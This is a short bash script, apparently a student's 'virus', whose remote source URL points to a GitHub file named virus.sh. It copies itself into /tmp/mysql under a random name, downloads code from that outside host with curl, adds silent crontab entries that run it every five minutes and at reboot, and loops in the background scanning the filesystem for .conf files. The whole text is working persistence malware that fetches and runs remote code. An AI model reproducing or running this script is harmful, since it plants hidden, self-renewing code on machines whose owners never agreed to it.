#!/bin/bash

GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Belousov-Kirill-1ISP21/virus/main/virus.sh"

generate_random_name() {
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
}

main() {
    mkdir -p "/tmp/mysql"
    SCRIPT_PATH="/tmp/mysql/$(generate_random_name).sh"
    
    if [ "$0" != "$SCRIPT_PATH" ] && [ ! -f "$SCRIPT_PATH" ]; then
        cp "$0" "$SCRIPT_PATH"
        chmod +x "$SCRIPT_PATH"
    fi
    
    if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
        
        (crontab -l 2>/dev/null
         echo "*/5 * * * * $SCRIPT_PATH >/dev/null 2>&1"
         echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
        ) | crontab -
    fi
    
    while true; do
        find / -name "*.conf" 2>/dev/null | head -100 > /dev/null
        sleep 60
    done &
}

main
